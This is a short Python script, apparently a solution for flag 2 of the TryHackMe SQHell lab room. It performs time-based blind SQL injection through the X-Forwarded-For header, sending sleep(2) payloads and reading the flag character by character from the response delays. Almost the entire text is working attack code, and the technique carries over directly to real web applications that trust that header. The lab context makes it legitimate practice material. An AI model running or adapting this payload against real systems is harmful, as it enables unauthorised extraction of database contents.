# Script to retrieve flag 2 for room SQHell - https://tryhackme.com/room/sqhell

import requests
import time
import string

url = "" #Room IP

characterlist = string.ascii_uppercase + string.digits + '{' + '}' + ':'

flag = ""

counter = 1

payload = f"1' AND (SELECT sleep(2) FROM flag where SUBSTR(flag,{counter},1) = '2') and '1'='1"

headers = {'X-Forwarded-For':payload}

while True:
    for i in characterlist:
        payload = f"1' AND (SELECT sleep(2) FROM flag where SUBSTR(flag,{counter},1) = '{i}') and '1'='1"
        headers = {'X-Forwarded-For':payload}
        start = time.time()
        r = requests.get(url, headers = headers)
        end = time.time()
        if end-start >= 2:
            flag += i
            counter += 1
            break
    print(flag)
    if len(flag) >= 43:
        exit(f"The Flag is: {flag}")

